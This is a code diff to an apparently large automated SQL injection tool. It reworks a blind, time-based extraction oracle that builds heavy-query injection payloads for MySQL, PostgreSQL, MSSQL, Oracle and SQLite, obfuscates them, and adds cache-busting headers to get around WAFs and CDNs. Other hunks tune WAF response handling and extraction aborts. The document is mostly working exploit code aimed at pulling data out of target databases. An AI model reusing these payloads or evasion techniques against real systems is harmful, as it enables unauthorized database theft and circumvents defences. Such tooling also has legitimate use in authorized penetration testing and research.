@@ -56574,14 +56574,17 @@ class Scanner:
                                     await asyncio.sleep(1.0)
                                     _fp_bsl_f, _ = await asyncio.wait_for(
                                         _send_payload(_bsl_false_cond), timeout=15)
+                                    _bsl_waf_codes = {400, 403, 406, 429, 430, 503}
                                     _norm_t = (ResponseNormaliser.normalise(
                                                    _extract_body_safe(_fp_bsl_t))
                                                if (_fp_bsl_t
+                                                   and getattr(_fp_bsl_t, 'status_code', 200) not in _bsl_waf_codes
                                                    and _validate_response(_fp_bsl_t, allow_empty=True))
                                                else b"")
                                     _norm_f = (ResponseNormaliser.normalise(
                                                    _extract_body_safe(_fp_bsl_f))
                                                if (_fp_bsl_f
+                                                   and getattr(_fp_bsl_f, 'status_code', 200) not in _bsl_waf_codes
                                                    and _validate_response(_fp_bsl_f, allow_empty=True))
                                                else b"")
                                 except Exception as _bsl_ref_e:
@@ -122540,148 +122543,145 @@ class UniversalScanOrchestrator:
                                                           "(WAFBypass/Exotic/Hybrid/Standard detection) — extraction can proceed",
                                                           flush=True)
 
-                                                # FIX-4: When the WB body-diff oracle cannot be wired (WAF
-                                                # blocks baseline/calibration probes, CDN caches bypass page
-                                                # identically for TRUE and FALSE), fall back to a heavy-query
-                                                # timing oracle. WAF-bypass techniques (ST/NV/WB/EX/HY) detected
-                                                # via bypassed WAF should use generate_series / cross-join heavy
-                                                # queries instead of pg_sleep/WAITFOR/SLEEP which the same WAF
-                                                # typically blocks by keyword at extraction time.
-                                                if not _wired_fallback:
-                                                    _st_timing_sleep_s = max(
-                                                        getattr(getattr(_scanner_ref, 'config', None), 'time_sec', 5) or 5, 3)
-                                                    _bl_mean_st = (baseline.get('mean_timing', 200)
-                                                                   if isinstance(baseline, dict) else 200)
-                                                    _sto_req_count = [0]
-                                                    _st_inj_pfx = _wb_inj_pfx  # derived above via _derive_inj_prefix
+                                            # FIX-4: Universal heavy-query timing oracle fallback.
+                                            # Fires for any technique (WB/EX/HY/ST or unknown) that
+                                            # failed to wire a body-diff or error oracle above.
+                                            if not _wired_fallback:
+                                                _st_timing_sleep_s = max(
+                                                    getattr(getattr(_scanner_ref, 'config', None), 'time_sec', 5) or 5, 3)
+                                                _bl_mean_st = (baseline.get('mean_timing', 200)
+                                                               if isinstance(baseline, dict) else 200)
+                                                _sto_req_count = [0]
+                                                _st_inj_pfx = _derive_inj_prefix(_det_for_oracle)
+                                                _st_universal_tmpl = _build_det_template(_det_for_oracle)
 
-                                                    async def _inline_st_timing_oracle(
-                                                            _cond,
-                                                            _e=_scanner_ref.engine,
-                                                            _m=method, _u=url, _d=data,
-                                                            _df=data_fmt, _p=_det_param,
-                                                            _o=_det_orig, _tc=_det_tamper,
-                                                            _ts=_st_timing_sleep_s,
-                                                            _bl=_bl_mean_st,
-                                                            _db=_confirmed_dbms,
-                                                            _rc=_sto_req_count,
-                                                            _ipfx=_st_inj_pfx,
-                                                            _tmpl=_wb_tmpl):
-                                                        try:
-                                                            # BUG-TIMING-ORACLE-STYLE FIX: Detection may use
-                                                            # ||CASE WHEN style (concatenation injection) while
-                                                            # the AND-style payloads below assume numeric/AND
-                                                            # context. When a template is available (built from
-                                                            # exact_sent_payload preserving detection structure),
-                                                            # embed the timing condition into [INFERENCE] slot.
-                                                            # Template already includes original prefix — send
-                                                            # directly without _o prefix (double-prefix fix).
-                                                            if _tmpl:
-                                                                if _db in ('MySQL', 'MariaDB', 'TiDB'):
-                                                                    _timing_inner = (
-                                                                        f"(SELECT count(*) FROM "
-                                                                        f"information_schema.tables a,"
-                                                                        f"information_schema.tables b "
-                                                                        f"WHERE ({_cond})) IS NOT NULL")
-                                                                elif _db in ('PostgreSQL', 'CockroachDB',
-                                                                             'YugabyteDB', 'Amazon Redshift'):
-                                                                    _hq_rows_st = max(1000000, min(int(_ts * 1000000), 8000000))
-                                                                    _timing_inner = (
-                                                                        f"(SELECT count(*) FROM "
-                                                                        f"generate_series(1,CASE WHEN ({_cond}) "
-                                                                        f"THEN {_hq_rows_st} ELSE 1 END)) IS NOT NULL")
-                                                                elif _db in ('MSSQL', 'Sybase'):
-                                                                    _timing_inner = (
-                                                                        f"(SELECT CASE WHEN ({_cond}) "
-                                                                        "THEN (SELECT COUNT(*) FROM sys.all_columns A "
-                                                                        "CROSS JOIN (SELECT TOP 100 object_id FROM "
-                                                                        "sys.all_columns) B WHERE A.object_id IS NOT NULL) "
-                                                                        "ELSE CAST(0 AS INT) END) IS NOT NULL")
-                                                                elif _db == 'Oracle':
-                                                                    _timing_inner = (
-                                                                        f"(SELECT CASE WHEN ({_cond}) "
-                                                                        "THEN (SELECT COUNT(*) FROM all_objects A, "
-                                                                        "all_objects B WHERE ROWNUM<500000) "
-                                                                        "ELSE 0 END FROM DUAL) IS NOT NULL")
-                                                                elif _db == 'SQLite':
-                                                                    _iters_st = min(int(_ts * 1_000_000), 4_000_000)
-                                                                    _timing_inner = (
-                                                                        f"CASE WHEN ({_cond}) "
-                                                                        f"THEN LIKE('X',HEX(RANDOMBLOB({_iters_st}))) "
-                                                                        "ELSE 1=1 END")
-                                                                else:
-                                                                    _timing_inner = _cond
-                                                                _pay = _tmpl.replace('[INFERENCE]', _timing_inner)
-                                                            elif _db in ('MySQL', 'MariaDB', 'TiDB'):
-                                                                _pay = (f"{_o}{_ipfx} AND (SELECT count(*) FROM "
-                                                                        f"information_schema.tables a,"
-                                                                        f"information_schema.tables b "
-                                                                        f"WHERE ({_cond})) IS NOT NULL-- -")
+                                                async def _inline_st_timing_oracle(
+                                                        _cond,
+                                                        _e=_scanner_ref.engine,
+                                                        _m=method, _u=url, _d=data,
+                                                        _df=data_fmt, _p=_det_param,
+                                                        _o=_det_orig, _tc=_det_tamper,
+                                                        _ts=_st_timing_sleep_s,
+                                                        _bl=_bl_mean_st,
+                                                        _db=_confirmed_dbms,
+                                                        _rc=_sto_req_count,
+                                                        _ipfx=_st_inj_pfx,
+                                                        _tmpl=_st_universal_tmpl):
+                                                    try:
+                                                        # BUG-TIMING-ORACLE-STYLE FIX: Detection may use
+                                                        # ||CASE WHEN style (concatenation injection) while
+                                                        # the AND-style payloads below assume numeric/AND
+                                                        # context. When a template is available (built from
+                                                        # exact_sent_payload preserving detection structure),
+                                                        # embed the timing condition into [INFERENCE] slot.
+                                                        # Template already includes original prefix — send
+                                                        # directly without _o prefix (double-prefix fix).
+                                                        if _tmpl:
+                                                            if _db in ('MySQL', 'MariaDB', 'TiDB'):
+                                                                _timing_inner = (
+                                                                    f"(SELECT count(*) FROM "
+                                                                    f"information_schema.tables a,"
+                                                                    f"information_schema.tables b "
+                                                                    f"WHERE ({_cond})) IS NOT NULL")
                                                             elif _db in ('PostgreSQL', 'CockroachDB',
                                                                          'YugabyteDB', 'Amazon Redshift'):
                                                                 _hq_rows_st = max(1000000, min(int(_ts * 1000000), 8000000))
-                                                                _pay = (f"{_o}{_ipfx} AND (SELECT count(*) FROM "
-                                                                        f"generate_series(1,CASE WHEN ({_cond}) "
-                                                                        f"THEN {_hq_rows_st} ELSE 1 END)) IS NOT NULL-- -")
+                                                                _timing_inner = (
+                                                                    f"(SELECT count(*) FROM "
+                                                                    f"generate_series(1,CASE WHEN ({_cond}) "
+                                                                    f"THEN {_hq_rows_st} ELSE 1 END)) IS NOT NULL")
                                                             elif _db in ('MSSQL', 'Sybase'):
-                                                                _pay = (f"{_o}{_ipfx} AND (SELECT CASE WHEN ({_cond}) "
-                                                                        "THEN (SELECT COUNT(*) FROM sys.all_columns A "
-                                                                        "CROSS JOIN (SELECT TOP 100 object_id FROM "
-                                                                        "sys.all_columns) B WHERE A.object_id IS NOT NULL) "
-                                                                        "ELSE CAST(0 AS INT) END) IS NOT NULL-- -")
+                                                                _timing_inner = (
+                                                                    f"(SELECT CASE WHEN ({_cond}) "
+                                                                    "THEN (SELECT COUNT(*) FROM sys.all_columns A "
+                                                                    "CROSS JOIN (SELECT TOP 100 object_id FROM "
+                                                                    "sys.all_columns) B WHERE A.object_id IS NOT NULL) "
+                                                                    "ELSE CAST(0 AS INT) END) IS NOT NULL")
                                                             elif _db == 'Oracle':
-                                                                _pay = (f"{_o}{_ipfx} AND (SELECT CASE WHEN ({_cond}) "
-                                                                        "THEN (SELECT COUNT(*) FROM all_objects A, "
-                                                                        "all_objects B WHERE ROWNUM<500000) "
-                                                                        "ELSE 0 END FROM DUAL) IS NOT NULL-- -")
+                                                                _timing_inner = (
+                                                                    f"(SELECT CASE WHEN ({_cond}) "
+                                                                    "THEN (SELECT COUNT(*) FROM all_objects A, "
+                                                                    "all_objects B WHERE ROWNUM<500000) "
+                                                                    "ELSE 0 END FROM DUAL) IS NOT NULL")
                                                             elif _db == 'SQLite':
                                                                 _iters_st = min(int(_ts * 1_000_000), 4_000_000)
-                                                                _pay = (f"{_o}{_ipfx} AND CASE WHEN ({_cond}) "
-                                                                        f"THEN LIKE('X',HEX(RANDOMBLOB({_iters_st}))) "
-                                                                        "ELSE 1=1 END-- -")
+                                                                _timing_inner = (
+                                                                    f"CASE WHEN ({_cond}) "
+                                                                    f"THEN LIKE('X',HEX(RANDOMBLOB({_iters_st}))) "
+                                                                    "ELSE 1=1 END")
                                                             else:
-                                                                _pay = f"{_o}{_ipfx} AND SLEEP({_ts})-- -"
-                                                            _rc[0] += 1
-                                                            _pay = apply_heavy_variation(_pay, _rc[0], data_fmt=_df)
-                                                            _pay = _obfuscate_extraction_cond(_pay, _rc[0])
-                                                            _pay = apply_sql_noise(_pay, _rc[0])
-                                                            _cb_sto = random.randint(1000000, 9999999)
-                                                            _ch_sto = hashlib.md5(
-                                                                _pay.encode('utf-8', errors='replace')).hexdigest()[:10]
-                                                            _cb_u_sto = (_u + ("&" if "?" in _u else "?")
-                                                                         + _get_cache_bust_params(_cb_sto, _ch_sto))
-                                                            _cdn_hdrs_sto = {
-                                                                "Cache-Control": "no-cache, no-store",
-                                                                "Pragma": "no-cache",
-                                                                "Accept-Language": f"en-US,en;q=0.{_cb_sto % 9000 + 1000}",
-                                                            }
-                                                            _t0_sto = time.monotonic()
-                                                            await asyncio.wait_for(
-                                                                _send_injected(_e, _m, _cb_u_sto, _d, _df, _p, _pay, _tc,
-                                                                               extra_headers=_cdn_hdrs_sto),
-                                                                timeout=_ts * 3)
-                                                            _elapsed_ms_sto = (time.monotonic() - _t0_sto) * 1000
-                                                            if _db == 'SQLite':
-                                                                _threshold_ms_sto = _bl + max(
-                                                                    int((_iters_st / 4_000_000) * 1500), 300)
-                                                            else:
-                                                                _threshold_ms_sto = _bl + (_ts * 1000 * 0.65)
-                                                            return _elapsed_ms_sto >= _threshold_ms_sto
-                                                        except Exception:
-                                                            return False
+                                                                _timing_inner = _cond
+                                                            _pay = _tmpl.replace('[INFERENCE]', _timing_inner)
+                                                        elif _db in ('MySQL', 'MariaDB', 'TiDB'):
+                                                            _pay = (f"{_o}{_ipfx} AND (SELECT count(*) FROM "
+                                                                    f"information_schema.tables a,"
+                                                                    f"information_schema.tables b "
+                                                                    f"WHERE ({_cond})) IS NOT NULL-- -")
+                                                        elif _db in ('PostgreSQL', 'CockroachDB',
+                                                                     'YugabyteDB', 'Amazon Redshift'):
+                                                            _hq_rows_st = max(1000000, min(int(_ts * 1000000), 8000000))
+                                                            _pay = (f"{_o}{_ipfx} AND (SELECT count(*) FROM "
+                                                                    f"generate_series(1,CASE WHEN ({_cond}) "
+                                                                    f"THEN {_hq_rows_st} ELSE 1 END)) IS NOT NULL-- -")
+                                                        elif _db in ('MSSQL', 'Sybase'):
+                                                            _pay = (f"{_o}{_ipfx} AND (SELECT CASE WHEN ({_cond}) "
+                                                                    "THEN (SELECT COUNT(*) FROM sys.all_columns A "
+                                                                    "CROSS JOIN (SELECT TOP 100 object_id FROM "
+                                                                    "sys.all_columns) B WHERE A.object_id IS NOT NULL) "
+                                                                    "ELSE CAST(0 AS INT) END) IS NOT NULL-- -")
+                                                        elif _db == 'Oracle':
+                                                            _pay = (f"{_o}{_ipfx} AND (SELECT CASE WHEN ({_cond}) "
+                                                                    "THEN (SELECT COUNT(*) FROM all_objects A, "
+                                                                    "all_objects B WHERE ROWNUM<500000) "
+                                                                    "ELSE 0 END FROM DUAL) IS NOT NULL-- -")
+                                                        elif _db == 'SQLite':
+                                                            _iters_st = min(int(_ts * 1_000_000), 4_000_000)
+                                                            _pay = (f"{_o}{_ipfx} AND CASE WHEN ({_cond}) "
+                                                                    f"THEN LIKE('X',HEX(RANDOMBLOB({_iters_st}))) "
+                                                                    "ELSE 1=1 END-- -")
+                                                        else:
+                                                            _pay = f"{_o}{_ipfx} AND SLEEP({_ts})-- -"
+                                                        _rc[0] += 1
+                                                        _pay = apply_heavy_variation(_pay, _rc[0], data_fmt=_df)
+                                                        _pay = _obfuscate_extraction_cond(_pay, _rc[0])
+                                                        _pay = apply_sql_noise(_pay, _rc[0])
+                                                        _cb_sto = random.randint(1000000, 9999999)
+                                                        _ch_sto = hashlib.md5(
+                                                            _pay.encode('utf-8', errors='replace')).hexdigest()[:10]
+                                                        _cb_u_sto = (_u + ("&" if "?" in _u else "?")
+                                                                     + _get_cache_bust_params(_cb_sto, _ch_sto))
+                                                        _cdn_hdrs_sto = {
+                                                            "Cache-Control": "no-cache, no-store",
+                                                            "Pragma": "no-cache",
+                                                            "Accept-Language": f"en-US,en;q=0.{_cb_sto % 9000 + 1000}",
+                                                        }
+                                                        _t0_sto = time.monotonic()
+                                                        await asyncio.wait_for(
+                                                            _send_injected(_e, _m, _cb_u_sto, _d, _df, _p, _pay, _tc,
+                                                                           extra_headers=_cdn_hdrs_sto),
+                                                            timeout=_ts * 3)
+                                                        _elapsed_ms_sto = (time.monotonic() - _t0_sto) * 1000
+                                                        if _db == 'SQLite':
+                                                            _threshold_ms_sto = _bl + max(
+                                                                int((_iters_st / 4_000_000) * 1500), 300)
+                                                        else:
+                                                            _threshold_ms_sto = _bl + (_ts * 1000 * 0.65)
+                                                        return _elapsed_ms_sto >= _threshold_ms_sto
+                                                    except Exception:
+                                                        return False
 
-                                                    if not hasattr(_enum, '_mse_instance') or not _enum._mse_instance:
-                                                        class _FakeMSE_ST:
-                                                            _boolean_oracle = None
-                                                            _oracles = []
-                                                        _enum._mse_instance = _FakeMSE_ST()
-                                                    _enum._mse_instance._boolean_oracle = _inline_st_timing_oracle
-                                                    _enum._mse_instance._boolean_oracle_is_timing = True
-                                                    _wired_fallback = True
-                                                    print(f"[+] [V25-Extract] Inline heavy-query timing oracle wired "
-                                                          f"for tech={_det_tech!r} (WAF-bypass, body-diff unavailable, "
-                                                          f"DBMS={_confirmed_dbms!r}, sleep={_st_timing_sleep_s}s) — "
-                                                          "extraction can proceed", flush=True)
+                                                if not hasattr(_enum, '_mse_instance') or not _enum._mse_instance:
+                                                    class _FakeMSE_ST:
+                                                        _boolean_oracle = None
+                                                        _oracles = []
+                                                    _enum._mse_instance = _FakeMSE_ST()
+                                                _enum._mse_instance._boolean_oracle = _inline_st_timing_oracle
+                                                _enum._mse_instance._boolean_oracle_is_timing = True
+                                                _wired_fallback = True
+                                                print(f"[+] [V25-Extract] Inline heavy-query timing oracle wired "
+                                                      f"for tech={_det_tech!r} (universal fallback, body-diff unavailable, "
+                                                      f"DBMS={_confirmed_dbms!r}, sleep={_st_timing_sleep_s}s) — "
+                                                      "extraction can proceed", flush=True)
 
                                             if not _wired_fallback:
                                                 print("[!] [V25-Extract] ConditionalErrorOracle failed "
@@ -133806,6 +133806,8 @@ class MultiStrategyExtractor:
                                     return None
                                 _s_t = SimHasher.body_similarity(_norm_true_ref, _n_t2)
                                 _s_f = SimHasher.body_similarity(_norm_false_ref, _n_t2)
+                                if abs(_s_t - _s_f) < 0.05:
+                                    return None
                                 return _s_t > _s_f
 
                             self._oracles.insert(0, 'bool_simhash')
@@ -133905,12 +133907,12 @@ class MultiStrategyExtractor:
                             pass
                     if r2 and _r3_waf:
                         print(f"[MSE]  {name} WAF-corrupted (true→{r1}, false→{r2}, false2→{_r3_waf}) — all conditions return True; oracle unusable on this target", flush=True)
+                        # Cache this failure so future MSE instances skip re-probing
+                        if not hasattr(self.config, "_mse_oracle_blacklist"):
+                            self.config._mse_oracle_blacklist = set()
+                        self.config._mse_oracle_blacklist.add(name)
                     else:
                         print(f"[MSE]  {name} basic validation FAILED (true→{r1}, false→{r2})", flush=True)
-                    # Cache this failure so future MSE instances skip re-probing
-                    if not hasattr(self.config, "_mse_oracle_blacklist"):
-                        self.config._mse_oracle_blacklist = set()
-                    self.config._mse_oracle_blacklist.add(name)
                     continue
                 # Round 2: real extraction-style condition
                 if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
@@ -136361,7 +136363,7 @@ class SideChannelExtractor:
                 await asyncio.sleep(0.3)
 
             if (lo < 32 or lo > _sce_we_char_hi or not _bsearch_converged
-                    or (not _had_false_result and lo > 127)):
+                    or (not _had_false_result and lo >= _sce_we_char_hi)):
                 break
 
             ch = chr(lo)
@@ -167368,8 +167370,9 @@ class BatchedCharExtractor:
                       f"(WAF blocked pre-flight probe) — aborting extraction",
                       flush=True)
                 return '?' * length
-        except Exception:
-            pass  # sanity probe error → proceed optimistically
+        except Exception as _bce_sanity_exc:
+            print(f"[!] [BatchExtract] Oracle sanity probe exception: {_bce_sanity_exc} — aborting extraction", flush=True)
+            return '?' * length
 
         # Build list of all pair positions
         _pairs = []
@@ -167615,8 +167618,9 @@ class BitwiseExtractorSimple:
                       f"(WAF blocked pre-flight probe) — aborting extraction",
                       flush=True)
                 return '?' * length
-        except Exception:
-            pass  # sanity probe error → proceed optimistically
+        except Exception as _bw_sanity_exc:
+            print(f"[!] [BitwiseExtract] Oracle sanity probe exception: {_bw_sanity_exc} — aborting extraction", flush=True)
+            return '?' * length
 
         for batch_start in range(0, length, _batch_size):
             # BUG-BITWISESTOP FIX (Req 7/9): Abort when extraction is externally cancelled.
